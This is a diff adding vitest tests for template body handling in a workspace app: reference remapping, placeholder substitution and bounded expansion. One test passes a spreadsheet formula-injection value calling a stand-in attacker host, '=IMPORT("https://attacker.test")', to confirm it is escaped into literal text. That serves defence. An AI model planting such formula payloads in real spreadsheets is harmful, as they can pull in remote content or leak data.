@@ -1,5 +1,7 @@
 import { describe, expect, it } from 'vitest';
 import type { Pool } from 'pg';
+import type { ItemBody } from '@nix/export';
+import { evaluateSheet } from '@nix/sheet';
 import * as Y from 'yjs';
 
 import { strategyFor } from '../documents/body-kinds.ts';
@@ -7,12 +9,52 @@ import { LIMITS } from '../documents/limits.ts';
 import {
   copyBodies,
   documentFromArchiveBody,
+  inventoryItemReferences,
   remapItemReferences,
+  TemplateBodyError,
+  substituteTemplateBodyText,
+  transformTemplateBody,
   validateArchiveBodies,
   writeArchiveBodies,
 } from './bodies.ts';
 
 describe('template body reference remapping', () => {
+  it('remaps portable inline Nix links and removes references Core marked as omitted', () => {
+    const source = '11111111-1111-4111-8111-111111111111';
+    const target = '22222222-2222-4222-8222-222222222222';
+    const omitted = '33333333-3333-4333-8333-333333333333';
+    const portable = {
+      type: 'doc',
+      content: [
+        {
+          type: 'text',
+          text: 'Learn',
+          marks: [{ type: 'link', attrs: { href: `nix://item/${source}` } }],
+        },
+        {
+          type: 'text',
+          text: 'Legacy',
+          marks: [{ type: 'link', attrs: { href: `nix://item/${omitted}` } }],
+        },
+      ],
+    };
+
+    expect(
+      remapItemReferences(portable, new Map([[source, target]]), true, new Map([[omitted, null]])),
+    ).toEqual({
+      type: 'doc',
+      content: [
+        {
+          type: 'text',
+          text: 'Learn',
+          marks: [{ type: 'link', attrs: { href: `nix://item/${target}` } }],
+        },
+        { type: 'text', text: 'Legacy', marks: [] },
+      ],
+    });
+    expect(inventoryItemReferences(portable)).toEqual([source, omitted]);
+  });
+
   it('rewrites declared item references and leaves unrelated UUID values alone', () => {
     const source = '11111111-1111-4111-8111-111111111111';
     const target = '22222222-2222-4222-8222-222222222222';
@@ -176,9 +218,259 @@ describe('template body reference remapping', () => {
       },
     });
   });
+
+  it('applies Core reference mappings and explicit omissions only to declared item links', () => {
+    const external = '11111111-1111-4111-8111-111111111111';
+    const replacement = '22222222-2222-4222-8222-222222222222';
+    const remapped = transformTemplateBody(
+      'note',
+      {
+        type: 'doc',
+        content: [
+          { type: 'reference', attrs: { kind: 'item', targetId: external, label: 'Outside' } },
+          { type: 'paragraph', attrs: { arbitraryId: external } },
+        ],
+      },
+      new Map(),
+      { referenceMappings: new Map([[external, replacement]]) },
+    );
+    expect(remapped).toMatchObject({
+      content: [
+        { attrs: { targetId: replacement, label: 'Outside' } },
+        { attrs: { arbitraryId: external } },
+      ],
+    });
+
+    expect(
+      transformTemplateBody(
+        'note',
+        { type: 'reference', attrs: { kind: 'item', targetId: external, label: 'Outside' } },
+        new Map(),
+        { referenceMappings: new Map([[external, null]]) },
+      ),
+    ).toEqual({ type: 'reference', attrs: { kind: 'item', targetId: null, label: 'Outside' } });
+  });
+
+  it('inventories item targets before unknown references are stubbed during capture', () => {
+    const external = '11111111-1111-4111-8111-111111111111';
+    const body = {
+      type: 'doc',
+      content: [
+        { type: 'itemBlock', attrs: { targetId: external } },
+        { type: 'reference', attrs: { kind: 'principal', targetId: 'not-an-item' } },
+      ],
+    };
+
+    expect(inventoryItemReferences(body)).toEqual([external]);
+    expect(inventoryItemReferences(remapItemReferences(body, new Map(), true))).toEqual([]);
+  });
+});
+
+describe('template body text binding', () => {
+  it('preserves unresolved placeholders until Core supplies application bindings', () => {
+    const body = {
+      type: 'doc',
+      content: [{ type: 'paragraph', content: [{ type: 'text', text: 'Hello {{name}}' }] }],
+    };
+    expect(transformTemplateBody('note', body, new Map(), { stubUnknown: false })).toEqual(body);
+    expect(() => transformTemplateBody('note', body, new Map(), { textBindings: {} })).toThrow(
+      /Core did not resolve/,
+    );
+  });
+
+  it('substitutes prose leaves while preserving links, code, URLs and arbitrary attributes', () => {
+    const bindings = { name: 'Quarterly plan' };
+    const result = substituteTemplateBodyText(
+      'note',
+      {
+        type: 'doc',
+        content: [
+          { type: 'paragraph', content: [{ type: 'text', text: 'Welcome {{name}}.' }] },
+          {
+            type: 'paragraph',
+            content: [
+              {
+                type: 'text',
+                text: 'https://example.test/{{name}}',
+                marks: [{ type: 'link', attrs: { href: 'https://example.test/{{name}}' } }],
+              },
+            ],
+          },
+          { type: 'codeBlock', content: [{ type: 'text', text: 'const x = "{{name}}";' }] },
+          { type: 'reference', attrs: { targetId: '{{name}}', label: '{{name}}' } },
+        ],
+      },
+      bindings,
+    );
+
+    expect(result).toEqual({
+      type: 'doc',
+      content: [
+        { type: 'paragraph', content: [{ type: 'text', text: 'Welcome Quarterly plan.' }] },
+        {
+          type: 'paragraph',
+          content: [
+            {
+              type: 'text',
+              text: 'https://example.test/{{name}}',
+              marks: [{ type: 'link', attrs: { href: 'https://example.test/{{name}}' } }],
+            },
+          ],
+        },
+        { type: 'codeBlock', content: [{ type: 'text', text: 'const x = "{{name}}";' }] },
+        { type: 'reference', attrs: { targetId: '{{name}}', label: '{{name}}' } },
+      ],
+    });
+  });
+
+  it('substitutes only canvas text fields and literal sheet cells, never formulas', () => {
+    expect(
+      substituteTemplateBodyText(
+        'canvas',
+        {
+          elements: {
+            text: {
+              type: 'text',
+              text: 'Plan for {{name}}',
+              originalText: '{{name}}',
+              link: 'https://x/{{name}}',
+            },
+            shape: { type: 'rectangle', text: '{{name}}', customData: { name: '{{name}}' } },
+          },
+        },
+        { name: 'Q4' },
+      ),
+    ).toEqual({
+      elements: {
+        text: { type: 'text', text: 'Plan for Q4', originalText: 'Q4', link: 'https://x/{{name}}' },
+        shape: { type: 'rectangle', text: '{{name}}', customData: { name: '{{name}}' } },
+      },
+    });
+
+    const substitutedSheet = substituteTemplateBodyText(
+      'spreadsheet',
+      {
+        cells: { A1: '{{name}}', B1: '=1+1' },
+        meta: { rows: 1, cols: 2 },
+      },
+      { name: '=IMPORT("https://attacker.test")' },
+    );
+    expect(substitutedSheet).toEqual({
+      cells: { A1: '\'=IMPORT("https://attacker.test")', B1: '=1+1' },
+      meta: { rows: 1, cols: 2 },
+    });
+    const cells = (substitutedSheet as { cells: Record<string, string> }).cells;
+    const evaluated = evaluateSheet({ cells: new Map(Object.entries(cells)) });
+    expect(evaluated.values.get('A1')).toBe('=IMPORT("https://attacker.test")');
+    expect(evaluated.values.get('B1')).toBe(2);
+  });
+
+  it('rejects unresolved placeholders in supported text and bounds total expansion', () => {
+    for (const text of [
+      'Hello {{missing}}',
+      'Hello {{UPPER}}',
+      'Hello {{bad key}}',
+      'Hello {{name',
+    ]) {
+      expect(() =>
+        substituteTemplateBodyText(
+          'note',
+          { type: 'paragraph', content: [{ type: 'text', text }] },
+          {},
+        ),
+      ).toThrow(TemplateBodyError);
+    }
+    expect(() =>
+      substituteTemplateBodyText(
+        'note',
+        { type: 'paragraph', content: [{ type: 'text', text: '{{constructor}}' }] },
+        {},
+      ),
+    ).toThrow(/Core did not resolve/);
+    expect(() =>
+      substituteTemplateBodyText(
+        'note',
+        {
+          type: 'paragraph',
+          content: [
+            { type: 'text', text: '{{na', marks: [{ type: 'bold' }] },
+            { type: 'text', text: 'me}}', marks: [{ type: 'italic' }] },
+          ],
+        },
+        { name: 'A project' },
+      ),
+    ).toThrow(/unclosed input marker/);
+
+    const largeText = 'x'.repeat(200_000);
+    expect(
+      substituteTemplateBodyText(
+        'note',
+        { type: 'paragraph', content: [{ type: 'text', text: largeText }] },
+        {},
+      ),
+    ).toEqual({ type: 'paragraph', content: [{ type: 'text', text: largeText }] });
+    expect(() =>
+      substituteTemplateBodyText(
+        'note',
+        { type: 'paragraph', content: [{ type: 'text', text: '{{name}}'.repeat(1_000) }] },
+        { name: 'x'.repeat(200) },
+      ),
+    ).toThrow(/exceed the supported body expansion size/);
+  });
 });
 
 describe('template body materialization', () => {
+  it('preserves unresolved placeholders while capture and draft copies are materialized', async () => {
+    const sourceId = '71000000-0000-4000-8000-000000000001';
+    const targetId = '71000000-0000-4000-8000-000000000002';
+    const body: ItemBody = {
+      schemaVersion: 2,
+      prosemirror: {
+        type: 'doc',
+        content: [
+          { type: 'paragraph', content: [{ type: 'text', text: 'Hello {{project_name}}' }] },
+        ],
+      },
+    };
+    const copied = await copyBodies(
+      sourceBodyPool(sourceId, body),
+      writableAuthorization(),
+      [{ sourceItemId: sourceId, targetItemId: targetId, itemType: 'note' }],
+      new Map(),
+      { stubUnknown: false },
+    );
+
+    expect(copied).toEqual([targetId]);
+  });
+
+  it('hydrates an imported archive body without consuming its template markers', async () => {
+    const targetId = '72000000-0000-4000-8000-000000000002';
+    const body: ItemBody = {
+      schemaVersion: 2,
+      prosemirror: {
+        type: 'doc',
+        content: [
+          { type: 'paragraph', content: [{ type: 'text', text: 'Hello {{project_name}}' }] },
+        ],
+      },
+    };
+    const pool = emptyWritePool();
+    const written = await writeArchiveBodies(
+      pool,
+      writableAuthorization(),
+      [
+        {
+          sourceId: '72000000-0000-4000-8000-000000000001',
+          targetItemId: targetId,
+          itemType: 'note',
+          body,
+        },
+      ],
+      new Map(),
+    );
+    expect(written).toEqual([targetId]);
+  });
+
   it('round-trips resized sheet columns with the cell grid', () => {
     const body = {
       schemaVersion: 1,
@@ -314,7 +606,161 @@ describe('template body materialization', () => {
       commands.filter((command) => command.includes('INSERT INTO content_update')),
     ).toHaveLength(1);
   });
+
+  it('uses the staged body reference inventory when capture retries after the source changes', async () => {
+    const externalInStagedBody = '60000000-0000-4000-8000-000000000001';
+    const externalInEditedSource = '60000000-0000-4000-8000-000000000002';
+    const sourceItemId = '70000000-0000-4000-8000-000000000001';
+    const targetItemId = '70000000-0000-4000-8000-000000000002';
+    const internalSourceId = '70000000-0000-4000-8000-000000000003';
+    const internalTargetId = '70000000-0000-4000-8000-000000000004';
+    const sourceDocument = documentFromArchiveBody(
+      'note',
+      noteWithReference(externalInEditedSource),
+    );
+    const stagedDocument = documentFromArchiveBody(
+      'note',
+      noteWithReferences([externalInStagedBody, internalTargetId]),
+    );
+    const sourceUpdate = Buffer.from(Y.encodeStateAsUpdate(sourceDocument));
+    const stagedUpdate = Buffer.from(Y.encodeStateAsUpdate(stagedDocument));
+    sourceDocument.destroy();
+    stagedDocument.destroy();
+    const client = {
+      query: (text: string) => {
+        if (text.includes('snapshot.seq AS snapshot_seq')) {
+          return Promise.resolve({
+            rows: [
+              {
+                doc_id: '80000000-0000-4000-8000-000000000001',
+                item_id: sourceItemId,
+                workspace_id: '20000000-0000-4000-8000-000000000003',
+                schema_version: 2,
+                head_seq: '1',
+                snapshot_seq: '1',
+                yjs_state: sourceUpdate,
+              },
+              {
+                doc_id: '80000000-0000-4000-8000-000000000002',
+                item_id: targetItemId,
+                workspace_id: '20000000-0000-4000-8000-000000000003',
+                schema_version: 2,
+                head_seq: '1',
+                snapshot_seq: '1',
+                yjs_state: stagedUpdate,
+              },
+            ],
+            rowCount: 2,
+          });
+        }
+        return Promise.resolve({ rows: [], rowCount: 0 });
+      },
+      release: () => undefined,
+    };
+    const pool = { connect: () => Promise.resolve(client) } as unknown as Pool;
+    const inventories: string[][] = [];
+
+    await copyBodies(
+      pool,
+      {
+        tenantId: '20000000-0000-4000-8000-000000000001',
+        principalId: '20000000-0000-4000-8000-000000000002',
+        workspaceId: '20000000-0000-4000-8000-000000000003',
+        itemType: 'note',
+        canWrite: true,
+      },
+      [{ sourceItemId, targetItemId, itemType: 'note' }],
+      new Map([[internalSourceId, internalTargetId]]),
+      {
+        stubUnknown: false,
+        onReferenceInventory: ({ externalTargetIds }) => {
+          inventories.push([...externalTargetIds]);
+        },
+      },
+    );
+
+    expect(inventories).toEqual([[externalInStagedBody]]);
+  });
 });
+
+function noteWithReference(targetId: string): ItemBody {
+  return noteWithReferences([targetId]);
+}
+
+function noteWithReferences(targetIds: readonly string[]): ItemBody {
+  return {
+    schemaVersion: 2,
+    prosemirror: {
+      type: 'doc',
+      content: [
+        {
+          type: 'paragraph',
+          content: [
+            ...targetIds.map((targetId) => ({
+              type: 'reference',
+              attrs: { kind: 'item', targetId, label: 'Cached title' },
+            })),
+          ],
+        },
+      ],
+    },
+  };
+}
+
+function writableAuthorization() {
+  return {
+    tenantId: '20000000-0000-4000-8000-000000000001',
+    principalId: '20000000-0000-4000-8000-000000000002',
+    workspaceId: '20000000-0000-4000-8000-000000000003',
+    itemType: 'note',
+    canWrite: true,
+  } as const;
+}
+
+function emptyWritePool(): Pool {
+  const client = {
+    query: (text: string, values?: readonly unknown[]) => {
+      const rows = text.includes('RETURNING item_id')
+        ? ((values?.[4] ?? []) as string[]).map((item_id) => ({ item_id }))
+        : [];
+      return Promise.resolve({ rows, rowCount: rows.length });
+    },
+    release: () => undefined,
+  };
+  return { connect: () => Promise.resolve(client) } as unknown as Pool;
+}
+
+function sourceBodyPool(sourceId: string, body: ItemBody): Pool {
+  const source = documentFromArchiveBody('note', body);
+  const yjsState = Buffer.from(Y.encodeStateAsUpdate(source));
+  source.destroy();
+  const client = {
+    query: (text: string, values?: readonly unknown[]) => {
+      if (text.includes('snapshot.seq AS snapshot_seq')) {
+        return Promise.resolve({
+          rows: [
+            {
+              doc_id: '73000000-0000-4000-8000-000000000001',
+              item_id: sourceId,
+              workspace_id: '20000000-0000-4000-8000-000000000003',
+              schema_version: 2,
+              head_seq: '1',
+              snapshot_seq: '1',
+              yjs_state: yjsState,
+            },
+          ],
+          rowCount: 1,
+        });
+      }
+      const rows = text.includes('RETURNING item_id')
+        ? ((values?.[4] ?? []) as string[]).map((item_id) => ({ item_id }))
+        : [];
+      return Promise.resolve({ rows, rowCount: rows.length });
+    },
+    release: () => undefined,
+  };
+  return { connect: () => Promise.resolve(client) } as unknown as Pool;
+}
 
 it('remaps embedded notes and subpages during native archive import', () => {
   const source = '11111111-1111-4111-8111-111111111111';
